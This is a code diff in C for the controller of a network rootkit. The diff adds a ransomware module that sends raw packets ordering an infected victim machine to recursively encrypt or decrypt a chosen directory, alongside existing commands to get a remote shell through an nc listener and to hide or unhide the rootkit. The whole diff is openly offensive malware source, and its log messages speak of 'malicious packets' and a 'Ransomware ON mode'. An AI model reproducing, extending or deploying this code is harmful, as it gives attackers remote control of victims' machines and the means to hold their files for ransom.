@@ -26,22 +26,28 @@ void print_welcome_message(){
 }
 
 void print_help_dialog(const char* arg){
-    printf("\nUsage: %s [OPTION] victim_IP\n\n", arg);
+    printf("\nUsage: %s OPTION victim_IP\n\n", arg);
     printf("Program OPTIONs\n");
-    char* line = "-S victim_IP";
+    char* line = "-S";
     char* desc = "Get a remote shell to victim_IP";
-    printf("\t%-50s %-50s\n\n", line, desc);
-    line = "-u victim_IP";
+    printf("\t%-40s %-50s\n\n", line, desc);
+    line = "-p [PATH] -e";
+    desc = "*Ransom module* Recursively encrypt directory PATH on victim_IP";
+    printf("\t%-40s %-50s\n\n", line, desc);
+    line = "-p [PATH] -d";
+    desc = "*Ransom module* Recursively decrypt directory PATH on victim_IP";
+    printf("\t%-40s %-50s\n\n", line, desc);
+    line = "-u";
     desc = "Unhide the rootkit remotely from the host";
-    printf("\t%-50s %-50s\n\n", line, desc);
-    line = "-i victim_IP";
+    printf("\t%-40s %-50s\n\n", line, desc);
+    line = "-i";
     desc = "Hide the rootkit remotely from the host";
-    printf("\t%-50s %-50s\n\n", line, desc);
-    line = "\nProgram options";
-    printf("\t%-50s\n", line);
+    printf("\t%-40s %-50s\n\n", line, desc);
+    line = "\nOther options";
+    printf("\t%-40s\n", line);
     line = "-h";
     desc = "Print this help";
-    printf("\t%-50s %-50s\n\n", line, desc);
+    printf("\t%-40s %-50s\n\n", line, desc);
 
 }
 
@@ -107,7 +113,7 @@ void get_shell(char* argv){
     }else {
         //Activating listener
         char *cmd = "nc";
-        char *argv[3];
+        char *argv[4];
         argv[0] = "nc";
         argv[1] = "-lvp";
         argv[2] = "5888";
@@ -154,6 +160,46 @@ void hide_rootkit(char* argv){
     free(local_ip);
 }
 
+void encrypt_directory(char* argv, char* dir){
+    char* local_ip = getLocalIpAddress();
+    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
+    printf("["KBLU"INFO"RESET"]""Target PATH selected: %s\n", dir);
+    char data_buffer[1024];
+    strcpy(data_buffer, "UMBRA_ENCRYPT_DIR");
+    strcat(data_buffer, dir);
+    check_ip_address_format(argv);
+    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, data_buffer);
+    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
+    //Sending the malicious payload
+    if(rawsocket_send(packet)<0){
+        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
+    }else{
+        printf("["KGRN"OK"RESET"]""Request to encrypt directory successfully sent!\n");
+    }
+    free(local_ip);
+}
+
+void decrypt_directory(char* argv, char* dir){
+    char* local_ip = getLocalIpAddress();
+    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
+    printf("["KBLU"INFO"RESET"]""Target PATH selected: %s\n", dir);
+    char data_buffer[1024];
+    strcpy(data_buffer, "UMBRA_DECRYPT_DIR");
+    strcat(data_buffer, dir);
+    check_ip_address_format(argv);
+    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, data_buffer);
+    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
+    //Sending the malicious payload
+    if(rawsocket_send(packet)<0){
+        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
+    }else{
+        printf("["KGRN"OK"RESET"]""Request to decrypt directory successfully sent!\n");
+    }
+    free(local_ip);
+}
+
+
+
 
 void main(int argc, char* argv[]){
     if(argc<2){
@@ -161,13 +207,19 @@ void main(int argc, char* argv[]){
         print_help_dialog(argv[0]);
         return;
     }
-    
+
+    int ENCRYPT_MODE_SEL = 0;
+    int DECRYPT_MODE_SEL = 0;
+    int PATH_ARG_PROVIDED = 0;
+
+    int PARAM_MODULE_ACTIVATED = 0;
     
     int opt;
     char dest_address[32];
+    char path_arg[512];
 
     //Command line argument parsing
-    while ((opt = getopt(argc, argv, ":S:u:i:h")) != -1) {
+    while ((opt = getopt(argc, argv, ":S:u:i:p:e:d:h")) != -1) {
         switch (opt) {
         case 'S':
             print_welcome_message();
@@ -177,6 +229,7 @@ void main(int argc, char* argv[]){
             //printf("Option S has argument %s\n", optarg);
             strcpy(dest_address, optarg);
             get_shell(dest_address);
+            PARAM_MODULE_ACTIVATED = 1;
             
             break;
         case 'u': 
@@ -187,6 +240,7 @@ void main(int argc, char* argv[]){
             //printf("Option m has argument %s\n", optarg);
             strcpy(dest_address, optarg);
             show_rootkit(dest_address);
+            PARAM_MODULE_ACTIVATED = 1;
 
             break;
         case 'i': 
@@ -197,8 +251,23 @@ void main(int argc, char* argv[]){
             //printf("Option m has argument %s\n", optarg);
             strcpy(dest_address, optarg);
             hide_rootkit(dest_address);
+            PARAM_MODULE_ACTIVATED = 1;
+        
+        case 'e': 
+            ENCRYPT_MODE_SEL = 1;
+            strcpy(dest_address, optarg);
 
             break;
+        case 'd':
+            DECRYPT_MODE_SEL = 1;
+            strcpy(dest_address, optarg);
+            break;
+
+        case 'p':
+            PATH_ARG_PROVIDED = 1;
+            strcpy(path_arg, optarg);
+            break;
+
         case 'h':
             print_help_dialog(argv[0]);
             exit(0);
@@ -215,6 +284,25 @@ void main(int argc, char* argv[]){
             print_help_dialog(argv[0]);
             exit(EXIT_FAILURE);
         }
+    }
+
+    //Checking activated mode, for those requiring multiple args
+    if(ENCRYPT_MODE_SEL == 1 && PATH_ARG_PROVIDED == 1){
+        print_welcome_message();
+        sleep(1);
+        //Selecting encrypt directory - Ransomware ON mode
+        printf("["KBLU"INFO"RESET"]""Selected ENCRYPT a rootkit remotely\n");
+        encrypt_directory(dest_address, path_arg);
+    }else if(DECRYPT_MODE_SEL == 1 && PATH_ARG_PROVIDED == 1){
+        print_welcome_message();
+        sleep(1);
+        //Selecting encrypt directory - Ransomware ON mode
+        printf("["KBLU"INFO"RESET"]""Selected DECRYPT a rootkit remotely\n");
+        decrypt_directory(dest_address, path_arg);
+    }else if(PARAM_MODULE_ACTIVATED==0){
+        printf("["KRED"ERROR"RESET"]""Invalid parameters\n");
+        print_help_dialog(argv[0]);
+        exit(EXIT_FAILURE);
     }
    
 }
